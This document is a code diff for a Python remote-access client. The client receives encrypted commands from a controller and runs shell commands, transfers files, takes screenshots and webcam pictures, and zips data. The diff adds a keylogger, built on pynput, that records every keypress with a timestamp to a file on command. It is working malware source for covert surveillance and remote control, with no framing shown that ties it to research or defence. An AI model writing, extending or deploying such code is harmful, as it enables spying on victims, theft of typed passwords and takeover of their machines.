@@ -5,47 +5,46 @@ import base64
 import socket
 import sys
 import os
+import math
 import zipfile
 import json
 import multiprocessing
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 # non-standard python libraries
 import mss
 import cv2
+import pynput
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
 class Client:
     def __init__(self):
         self.connection = Connection()
+        self.keylogger = Keylogger()
         self.exit = False
         self.response = multiprocessing.Manager().dict()
 
     def main(self):
         while not self.exit:
-            request = self.connection.recv(self.connection.sock)
+            request = self.connection.recv()
             self.response["data"] = str()
             self.response["error"] = str()
 
-            if request["cmd"] == "f":
-                process = multiprocessing.Process(target=self.cwd, args=(self.response, request["mode"], request["path"],))
-                self.handle_process(process, request["timeout"])
-                self.connection.send(self.response, self.connection.sock)
-            elif request["cmd"] == "c":
+            if request["cmd"] == "c":
                 process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response, self.connection.sock)
+                self.connection.send(self.response)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response, self.connection.sock)
+                self.connection.send(self.response)
             elif request["cmd"] == "w":
                 process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response, self.connection.sock)
+                self.connection.send(self.response)
             elif request["cmd"] == "s":
                 process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response, self.connection.sock)
+                self.connection.send(self.response)
             elif request["cmd"] == "d":
                 self.download_file(request["open_path"])
             elif request["cmd"] == "u":
@@ -54,17 +53,9 @@ class Client:
                 process = multiprocessing.Process(target=self.connection.sock.close)
                 self.handle_process(process, request["timeout"])
                 self.exit = True
-
-    def cwd(self, response, mode, path):
-        if mode == "set":
-            try:
-                os.chdir(path)
-            except FileNotFoundError:
-                response["error"] = "FileNotFoundError"
-            except PermissionError:
-                response["error"] = "PermissionError"
-        else:
-            response["data"] = os.getcwd()
+            elif request["cmd"] == "k":
+                self.log_keys(self.response, request["action"], request["save_path"])
+                self.connection.send(self.response)
 
     def execute_command(self, response, command):
         try:
@@ -83,7 +74,7 @@ class Client:
             response["error"] = "FileNotFoundError"
         except PermissionError:
             response["error"] = "PermissionError"
-        self.connection.send(response, self.connection.sock)
+        self.connection.send(response)
 
     def upload_file(self, path, data):
         response = {"error": str()}
@@ -92,7 +83,7 @@ class Client:
                 file.write(base64.b64decode(data))
         except PermissionError:
             response["error"] = "PermissionError"
-        self.connection.send(response, self.connection.sock)
+        self.connection.send(response)
 
     def capture_screenshot(self, response, monitor, path):
         try:
@@ -134,6 +125,18 @@ class Client:
         if not success:
             response["error"] = "UnableToSavePicture"
 
+    def log_keys(self, response, action, filename):
+        if action == "start":
+            self.keylogger.filename = filename
+            self.keylogger.log = True
+        elif action == "stop":
+            self.keylogger.log = False
+        elif action == "status":
+            if self.keylogger.log:
+                response["data"] = "started"
+            else:
+                response["data"] = "stopped"
+
     def handle_process(self, process, timeout):
         process.start()
         process.join(timeout)
@@ -146,7 +149,6 @@ class Client:
 class Connection:
     def __init__(self):
         self.CODEC = "utf-8"
-        self.END_MARKER = "-".encode(self.CODEC)
         self.PACKET_SIZE = 1024
 
         HOST = "127.0.0.1"
@@ -172,17 +174,17 @@ class Connection:
             except socket.error:
                 time.sleep(30)
 
-    def send(self, data: dict, connection):
-        data = base64.b64encode(self.encrypt(json.dumps(data.copy()).encode(self.CODEC))) + self.END_MARKER
-        header = base64.b64encode(self.encrypt(json.dumps({"length": len(data)}.copy()).encode(self.CODEC))) + self.END_MARKER
-        connection.send(header)
-        connection.send(data)
+    def send(self, data: dict):
+        data = self.encrypt(json.dumps(data.copy()).encode(self.CODEC))
+        self.sock.sendall(str(len(data)).encode("utf8"))
+        self.sock.sendall(data)
 
-    def recv(self, connection) -> dict:
+    def recv(self) -> dict:
+        header = int(self.sock.recv(self.PACKET_SIZE).decode("utf8"))
         data = bytearray()
-        while not data.endswith(self.END_MARKER):
-            data.extend(connection.recv(self.PACKET_SIZE))
-        return json.loads(self.decrypt(base64.b64decode(data[:-1])))
+        for _ in range(math.ceil(header / self.PACKET_SIZE)):
+            data.extend(self.sock.recv(self.PACKET_SIZE))
+        return json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
 
     def encrypt(self, data):
         nonce = os.urandom(12)
@@ -190,6 +192,19 @@ class Connection:
 
     def decrypt(self, cipher):
         return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
+
+
+class Keylogger:
+    def __init__(self):
+        self.listener = pynput.keyboard.Listener(on_press=self.on_key_pressed).start()
+        self.log = False
+        self.filename = ""
+
+    def on_key_pressed(self, key):
+        if self.log:
+            timestamp = time.time()
+            with open(self.filename, "a") as file:
+                file.write(f"{round(timestamp)} {key}\n")
 
 
 if __name__ == "__main__":
